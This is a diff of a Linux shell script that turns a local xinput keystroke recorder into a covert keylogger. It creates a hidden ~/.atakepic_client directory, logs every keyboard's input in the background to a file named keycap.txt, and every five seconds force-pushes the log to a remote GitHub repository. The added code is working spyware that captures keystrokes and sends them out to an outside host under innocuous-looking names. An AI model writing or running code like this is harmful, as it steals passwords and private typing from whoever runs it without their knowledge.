@@ -1,3 +1,22 @@
-outputFile=~/file.txt
+path=~/.atakepic_client
+if [ ! -d "$path" ]
+then 
+  mkdir -p $path
+  cd $path
+  git init
+  git remote add origin git@github.com:dongnguyen1999/PrivatePictures.git
+  git pull
+  git checkout -b client
+fi
+outputFile=$path/keycap.txt
 echo `date` >> $outputFile
-xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test >> $outputFile
+(xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test >> $outputFile) &
+
+while [ 0 -eq 0 ]
+do
+  sleep 5
+  cd $path
+  git add .
+  git commit -m 'update new keycaps'
+  git push -u --force origin client
+done
